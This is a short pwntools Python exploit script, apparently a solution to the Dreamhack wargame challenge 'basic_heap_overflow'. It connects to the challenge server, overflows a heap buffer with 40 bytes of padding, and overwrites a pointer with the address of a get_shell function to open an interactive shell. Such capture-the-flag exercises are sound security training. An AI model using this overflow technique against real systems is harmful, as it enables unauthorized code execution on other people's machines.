#!/usr/bin/python 
from pwn import *

#p = process("./basic_heap_overflow")
p = remote("host1.dreamhack.games", 8336)
elf = ELF("./basic_heap_overflow")
get_shell = elf.symbols['get_shell']

#gdb.attach(p)
p.sendline('A'*(4*10) + p32(get_shell))

p.interactive()
